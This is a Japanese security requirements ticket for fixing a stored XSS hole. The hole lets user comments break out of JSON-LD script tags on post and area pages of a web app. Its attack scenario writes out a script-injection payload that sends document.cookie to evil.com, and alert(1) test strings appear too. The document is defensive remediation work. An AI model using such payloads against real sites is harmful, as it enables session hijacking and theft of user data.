# REQ-005: JSON-LD 構造化データにおける XSS 脆弱性の修正

## 背景

本アプリケーションではSEO目的で投稿詳細ページ（`/post/[id]`）および地域ページ（`/area/[municipality]`）にJSON-LD構造化データを埋め込んでいる。JSON-LDの出力に `dangerouslySetInnerHTML` と `JSON.stringify()` を使用しているが、`JSON.stringify()` は `</script>` や `<!--` などのHTML特殊シーケンスをエスケープしない。ユーザー投稿の `comment` フィールドがJSON-LDの `description` に含まれるため、悪意あるコメント（例: `</script><script>alert(1)</script>`）でXSSが成立する可能性がある。

## 現状の問題

- **`src/app/post/[id]/page.tsx:55-56`**: `dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}` および `dangerouslySetInnerHTML={{ __html: JSON.stringify(breadcrumbLd) }}` でユーザー由来データを含むJSON-LDを直接出力している。
- **`src/app/area/[municipality]/page.tsx:119-120`**: 同様に `dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}` および `dangerouslySetInnerHTML={{ __html: JSON.stringify(breadcrumbLd) }}` でJSON-LDを出力。地域ページのJSON-LDは現時点ではユーザー入力を直接含まないが、将来的にコメント集約等が追加された場合にリスクとなる。
- **`src/lib/seo.ts:34-36`**: `post.comment` をそのまま `commentSnippet` として切り出し、`seoDescription` に結合している。この `seoDescription` が `jsonLd.description`（`seo.ts:56`）に入る。
- **`src/lib/seo.ts:51-84`**: `jsonLd` オブジェクト内の `name`, `description` にユーザー由来値が入るが、`JSON.stringify()` は `</script>` を含む文字列をそのまま出力するため、ブラウザが `</script>` をスクリプトブロックの終端と解釈しXSSが成立する。

### 攻撃シナリオ

1. 攻撃者が `comment` フィールドに `</script><script>document.location='https://evil.com/steal?c='+document.cookie</script>` を含む投稿を作成する。
2. `generatePostSEO()` が `commentSnippet` としてこの文字列を `seoDescription` に含める。
3. `JSON.stringify()` は `</script>` をエスケープせずそのまま出力する。
4. ブラウザは `</script>` を `<script type="application/ld+json">` の終端と解釈し、後続の `<script>` タグが実行される。

## 目的

JSON-LD出力時にHTML特殊シーケンスを安全にエスケープし、ユーザー投稿データ経由のXSS攻撃を防止する。

## 要件

### 機能要件

- [ ] FR-005-01: JSON-LD出力用のサニタイズ関数を実装する。最低限 `</script>` → `<\/script>`, `<!--` → `<\\!--` のエスケープを行う。推奨実装: `JSON.stringify(data).replace(/</g, '\\u003c')` により `<` を全てUnicodeエスケープする。
- [ ] FR-005-02: `src/app/post/[id]/page.tsx` のJSON-LD出力（L55-56）にサニタイズ関数を適用する。
- [ ] FR-005-03: `src/app/area/[municipality]/page.tsx` のJSON-LD出力（L119-120）にサニタイズ関数を適用する。
- [ ] FR-005-04: 今後JSON-LDを追加する際に安全なヘルパーを再利用できるよう、共通ユーティリティ（例: `src/lib/seo.ts` 内に `safeJsonLdStringify` 関数）として提供する。

### 非機能要件

- [ ] NFR-005-01: サニタイズ処理はサーバーサイドレンダリング時にのみ実行されるため、クライアントバンドルサイズに影響を与えないこと。
- [ ] NFR-005-02: JSON-LDの構造化データとしての妥当性を維持すること（Google Rich Results Testで検証可能であること）。

## 受入条件

- [ ] AC-01: `comment` に `</script><script>alert(1)</script>` を含む投稿の詳細ページをブラウザで開いた際、XSSが発生しないこと。
- [ ] AC-02: `comment` に `</script>` を含む投稿でも、JSON-LDがGoogleのリッチリザルトテストで有効と判定されること。
- [ ] AC-03: サニタイズ関数に対するユニットテストが存在し、`</script>`, `<!--`, `<![CDATA[` 等のHTML特殊シーケンスがエスケープされることを検証していること。
- [ ] AC-04: `/area/[municipality]` ページのJSON-LD出力にも同じサニタイズが適用されていること。

## 影響範囲

- `src/lib/seo.ts` （サニタイズ関数の追加）
- `src/app/post/[id]/page.tsx` （L55-56 の修正）
- `src/app/area/[municipality]/page.tsx` （L119-120 の修正）

## 優先度

- **緊急度**: Critical
- **重要度**: Critical
- **理由**: ユーザー投稿データが未エスケープのままHTML内に出力されており、XSS攻撃によるセッションハイジャック、管理者権限の奪取、ユーザーデータの窃取が可能な状態。CSPに `unsafe-inline` が含まれているため（REQ-006参照）、CSPによる緩和も期待できない。
